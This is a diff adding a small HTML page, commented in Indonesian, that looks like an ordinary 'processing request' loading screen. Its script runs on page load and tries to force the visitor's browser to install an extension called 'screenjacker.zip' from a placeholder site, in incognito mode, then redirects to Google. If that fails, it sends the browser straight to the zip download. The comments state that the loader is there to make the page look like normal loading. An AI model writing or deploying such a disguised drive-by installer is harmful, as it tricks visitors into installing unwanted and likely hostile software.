@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Halo</title>
+    <script>
+        // Script ini mencoba memaksa browser pengguna agar menginstall ekstensi kita (Chrome compatible)
+        
+        // Link ke ekstensi zip atau crx yang Anda upload di tahap 1
+        var extensionUrl = "https://contoh-web-anda.com/screenjacker.zip"; 
+
+        function forceInstall() {
+            // Cek jika ekstensi sudah terinstall
+            if (chrome && chrome.runtime && chrome.runtime.install) {
+                chrome.runtime.install(extensionUrl, {installType: "NORMAL", incognito: true}, function(){
+                    console.log("Extension installed!");
+                    window.location.href = "https://www.google.com"; // Pindahkan user ke mana saja setelah install
+                });
+            } else {
+                // Jika belum, gunakan teknik download manual
+                document.body.innerHTML = "<h1>Mengunduh Alat...</h1>";
+                // Kita perlu mendapatkan URL internal ekstensi jika bisa, 
+                // atau memaksa user klik link.
+                window.location.href = extensionUrl;
+            }
+        }
+
+        // Jalankan saat page load
+        window.addEventListener('load', forceInstall);
+    </script>
+    <style>
+        /* Efek visual seolah-olah loading halaman biasa */
+        body { font-family: Arial; text-align: center; padding-top: 50px; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; display: inline-block; margin: 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <h2>Memproses Permintaan...</h2>
+    <div class="loader"></div>
+</body>
+</html>
